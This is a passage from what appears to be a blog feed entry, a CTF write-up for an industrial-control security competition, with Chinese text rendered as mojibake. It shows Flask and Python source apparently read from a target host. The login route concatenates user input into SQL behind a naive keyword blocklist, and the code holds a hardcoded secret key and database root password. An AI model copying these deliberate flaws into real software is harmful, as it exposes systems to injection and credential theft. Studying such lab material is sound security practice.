os<span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">from</span> base_info <span class="token keyword">import</span> sub_ids<span class="token punctuation">,</span> host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token keyword">from</span> mysql_db <span class="token keyword">import</span> MySQLDatabasenode_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\|(.*)'</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> sub_ids<span class="token punctuation">&#125;</span>abs_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">monitor_task</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> MySQLDatabase<span class="token punctuation">(</span>host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token punctuation">)</span> <span class="token keyword">as</span> db<span class="token punctuation">:</span>            result <span class="token operator">=</span> db<span class="token punctuation">.</span>execute_query<span class="token punctuation">(</span>                <span class="token string">"SELECT * FROM monitor WHERE name= %s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">:</span>                db<span class="token punctuation">.</span>update_record<span class="token punctuation">(</span>                    <span class="token string">"UPDATE monitor SET content=%s WHERE name = %s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                db<span class="token punctuation">.</span>update_record<span class="token punctuation">(</span>                    <span class="token string">"INSERT INTO monitor (name, name_key, content) VALUES (%s, %s, %s)"</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span>key<span class="token punctuation">,</span> node_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f">>>>> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>node_dict<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> è®°å½•è¢«ä¿®æ”¹ >>>>>"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"monitor_task_error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"monitor_task_use_time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;get_generate_plan.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaNUM_PLANS <span class="token operator">=</span> <span class="token number">20</span>MIN_PLAN_QUANTITY <span class="token operator">=</span> <span class="token number">10</span>MAX_PLAN_QUANTITY <span class="token operator">=</span> <span class="token number">100</span>MIN_PLAN_DURATION <span class="token operator">=</span> <span class="token number">1</span>MAX_PLAN_DURATION <span class="token operator">=</span> <span class="token number">14</span><span class="token keyword">def</span> <span class="token function">generate_plan</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    order_number <span class="token operator">=</span> generate_plan_number<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    plan_quantity <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>MIN_PLAN_QUANTITY<span class="token punctuation">,</span> MAX_PLAN_QUANTITY<span class="token punctuation">)</span>    plan_start <span class="token operator">=</span> random_date<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span>    plan_duration <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>MIN_PLAN_DURATION<span class="token punctuation">,</span> MAX_PLAN_DURATION<span class="token punctuation">)</span>    plan_end <span class="token operator">=</span> <span class="token punctuation">(</span>start_date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span>plan_duration<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span>    order_status <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"æ­£åœ¨è¿›è¡Œ"</span><span class="token punctuation">,</span> <span class="token string">"å·²å®Œæˆ"</span><span class="token punctuation">,</span> <span class="token string">"å–æ¶ˆ"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    completion_rate <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">"order_number"</span><span class="token punctuation">:</span> order_number<span class="token punctuation">,</span>        <span class="token string">"plan_quantity"</span><span class="token punctuation">:</span> plan_quantity<span class="token punctuation">,</span>        <span class="token string">"plan_start"</span><span class="token punctuation">:</span> plan_start<span class="token punctuation">,</span>        <span class="token string">"plan_end"</span><span class="token punctuation">:</span> plan_end<span class="token punctuation">,</span>        <span class="token string">"order_status"</span><span class="token punctuation">:</span> order_status<span class="token punctuation">,</span>        <span class="token string">"completion_rate"</span><span class="token punctuation">:</span> completion_rate    <span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">generate_plan_number</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ORDER-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start_date<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token keyword">def</span> <span class="token function">random_date</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">)</span><span class="token punctuation">:</span>    time_between <span class="token operator">=</span> end_date <span class="token operator">-</span> start_date    random_days <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> time_between<span class="token punctuation">.</span>days<span class="token punctuation">)</span>    <span class="token keyword">return</span> start_date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span>random_days<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">production_plan</span><span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> num_plans<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>generate_plan<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_plans<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_random_plan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    start_date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>date<span class="token punctuation">(</span><span class="token punctuation">)</span>    end_date <span class="token operator">=</span> start_date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> production_plan<span class="token punctuation">(</span>start_date<span class="token punctuation">,</span> end_date<span class="token punctuation">,</span> NUM_PLANS<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;scada&#x2F;app.pyï¼Œæ˜¯5001ç«¯å£ä¸Šçš„æœåŠ¡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span>Markup<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>flash<span class="token keyword">import</span> random<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy  <span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash  <span class="token keyword">import</span> pymysql<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token comment"># flag&#123;Yes_You_find_Me!&#125;</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'icssla'</span>  <span class="token comment"># è®¾ç½®ä¸€ä¸ªå¯†é’¥ç”¨äºsessionåŠ å¯†</span><span class="token comment"># æ•°æ®åº“è¿æ¥é…ç½®  </span>db_config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>      <span class="token string">'host'</span><span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>      <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token string">'root'</span><span class="token punctuation">,</span>      <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'abc123!@#'</span><span class="token punctuation">,</span>      <span class="token string">'db'</span><span class="token punctuation">:</span> <span class="token string">'flask_login_db'</span><span class="token punctuation">,</span>      <span class="token string">'charset'</span><span class="token punctuation">:</span> <span class="token string">'utf8mb4'</span><span class="token punctuation">,</span>      <span class="token string">'cursorclass'</span><span class="token punctuation">:</span> pymysql<span class="token punctuation">.</span>cursors<span class="token punctuation">.</span>DictCursor<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span> <span class="token comment"># è®¾ç½® session cookie çš„ HttpOnly å’Œ Secure æ ‡å¿—</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SESSION_COOKIE_HTTPONLY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># è®¾ç½®ä¸º Falseï¼Œå…è®¸ JavaScript è®¿é—®</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SESSION_COOKIE_SECURE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>  <span class="token comment"># è®¾ç½®ä¸º Falseï¼Œå…è®¸åœ¨ HTTP ä¸Šå‘é€ cookie</span><span class="token keyword">def</span> <span class="token function">contains_sql_keywords</span><span class="token punctuation">(</span>input_string<span class="token punctuation">,</span> keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> keyword <span class="token keyword">in</span> keywords<span class="token punctuation">:</span>          <span class="token keyword">if</span> keyword <span class="token keyword">in</span> input_string<span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token boolean">True</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token keyword">def</span> <span class="token function">contains_ssti_keywords</span><span class="token punctuation">(</span>input_string<span class="token punctuation">,</span> keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> keyword <span class="token keyword">in</span> keywords<span class="token punctuation">:</span>          <span class="token keyword">if</span> keyword <span class="token keyword">in</span> input_string<span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token boolean">True</span>      <span class="token keyword">return</span> <span class="token boolean">False</span>  <span class="token comment"># å‡è®¾è¿™æ˜¯ä½ çš„ç”¨æˆ·æ•°æ®åº“</span><span class="token comment">#users = &#123;</span><span class="token comment">#    "admin": "admin@123"</span><span class="token comment">#&#125;</span>md5_hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ç”Ÿæˆéšæœºé£æœºæ•°æ®</span><span class="token keyword">def</span> <span class="token function">generate_random_data</span><span class="token punctuation">(</span>page<span class="token punctuation">,</span> num_entries<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_entries<span class="token punctuation">)</span><span class="token punctuation">:</span>        fan <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Fan </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        speed <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>  <span class="token comment"># è½¬é€ŸèŒƒå›´ 1000-3000 RPM</span>        power <span class="token operator">=</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">100.0</span><span class="token punctuation">,</span> <span class="token number">500.0</span><span class="token punctuation">)</span>  <span class="token comment"># å‘ç”µé‡èŒƒå›´ 100-500 kW</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"fan"</span><span class="token punctuation">:</span> fan<span class="token punctuation">,</span> <span class="token string">"speed"</span><span class="token punctuation">:</span> speed<span class="token punctuation">,</span> <span class="token string">"power"</span><span class="token punctuation">:</span> power<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    page_size <span class="token operator">=</span> <span class="token number">10</span>  <span class="token comment"># æ¯é¡µæ˜¾ç¤ºçš„æ•°æ®æ¡æ•°</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        page <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span>        start_index <span class="token operator">=</span> <span class="token punctuation">(</span>page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> page_size        end_index <span class="token operator">=</span> start_index <span class="token operator">+</span> page_size        <span class="token keyword">return</span> data<span class="token punctuation">[</span>start_index<span class="token punctuation">:</span>end_index<span class="token punctuation">]</span><span class="token punctuation">,</span> page    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span>  <span class="token comment"># å¦‚æœè¾“å…¥çš„ä¸æ˜¯æœ‰æ•ˆçš„æ•´æ•°ï¼Œè¿”å›ç©ºæ•°æ®å’Œé»˜è®¤é¡µæ•°1</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'dashboard.html'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        sql_keywords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'from'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">,</span> <span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">'join'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">]</span>          input_string <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>          md5_hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>input_string<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        hex_dig <span class="token operator">=</span> md5_hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token operator">**</span>db_config<span class="token punctuation">)</span>          <span class="token keyword">if</span> contains_sql_keywords<span class="token punctuation">(</span>username<span class="token punctuation">,</span> sql_keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token string">"Error: There are illegal characters in the character you entered."</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>              <span class="token keyword">with</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cursor<span class="token punctuation">:</span>                  <span class="token comment"># æ‰§è¡ŒæŸ¥è¯¢  </span>                sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM users WHERE username ='"</span> <span class="token operator">+</span> username <span class="token operator">+</span><span class="token string">"'"</span>                cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                  <span class="token comment">#sql = "SELECT * FROM users WHERE username = %s"  </span>                <span class="token comment">#cursor.execute(sql, (username,))  </span>                result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment"># éªŒè¯ç”¨æˆ·åå’Œå¯†ç   </span>                <span class="token keyword">if</span> result <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>                       flash<span class="token punctuation">(</span><span class="token string">'Login successful!'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>                      session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username                      <span class="token comment"># å‡è®¾ session_token æ˜¯ä¸ session ç›¸å…³çš„ä¸€ä¸ªå€¼  </span>                    session_token <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ä»…ä¸ºç¤ºä¾‹  </span>                    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> hex_dig<span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> secure<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>                      <span class="token keyword">return</span> response                  <span class="token keyword">else</span><span class="token punctuation">:</span>                      flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> <span class="token string">'Invalid credentials'</span>        <span class="token keyword">finally</span><span class="token punctuation">:</span>              connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ååœ¨rootä¸‹ç¿»å‡ºä¸€ä¸ªflagï¼Œhomeä¸‹å¥½åƒä¹Ÿæœ‰ä¸€ä¸ªflagï¼Œäº¤äº†ä¿©flag</p><p>æ¥ä¸‹æ¥åº”è¯¥æ˜¯æ‹¿shellç„¶åæ‰“æ¨ªå‘ï¼Œä½†æ˜¯æ—¶é—´å¤ªçŸ­ååº”ä¸è¿‡æ¥ï¼ˆ</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;èµ›åˆ¶æ˜¯ ç†è®º + å·¥æ§ctf + æ¸—é€orè¿ç»´build&lt;/p&gt;
&lt;p&gt;ç†è®ºèµ›æœ¬åœ°å¤§æ¨¡å‹é­…åŠ›æ—¶åˆ»&lt;/p&gt;
&lt;p&gt;ctf éƒ¨åˆ†ä¸Šæ¥å…ˆè€ƒè®¡ç®—æœºç½‘ç»œ&amp;#x2F;è·¯ç”±äº¤æ¢å®è·µï¼Œè€Œæˆ‘è¿˜åœ¨é‡ä¿®è®¡ç½‘ï¼Œä»¤äººæ„Ÿå¹ï¼ˆ&lt;/p&gt;
&lt;p&gt;ç„¶åç”¨ ctf çš„åˆ†æ¢å–æ¸—é€&amp;#x2F;buildå¯åŠ¨ç¯å¢ƒçš„æœºä¼šï¼Œæ¸—é€æ¯æ¬¡å¯åŠ¨ç¯å¢ƒéƒ½åªæœ‰ä¸€å°æ—¶çš„æ—¶é—´èƒ½æ‰“ï¼Œåªèƒ½è¯´æ ¹æœ¬æ‰“ä¸å®Œ555&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128171247204.png&quot; alt=&quot;image-20241128171247204&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>é¢‘è°±åˆ†æ</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/</id>
    <published>2024-11-26T07:36:35.000Z</published>
    <updated>2024-12-23T15:32:25.789Z</updated>
    
